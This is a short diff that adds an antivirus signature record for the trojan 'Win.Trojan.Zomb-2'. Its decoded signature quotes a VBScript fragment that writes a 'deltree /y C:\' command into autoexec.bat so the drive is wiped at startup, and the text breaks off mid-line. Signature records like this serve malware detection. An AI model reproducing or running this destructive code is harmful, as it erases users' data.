@@ -1,0 +1,9 @@
+VIRUS NAME: Win.Trojan.Zomb-2
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+extfile("c:\autoexec.bat", 2, True)
+g.writeline "echo off"
+g.writeline "@deltree /y C:\"
+g.Close
+WScr
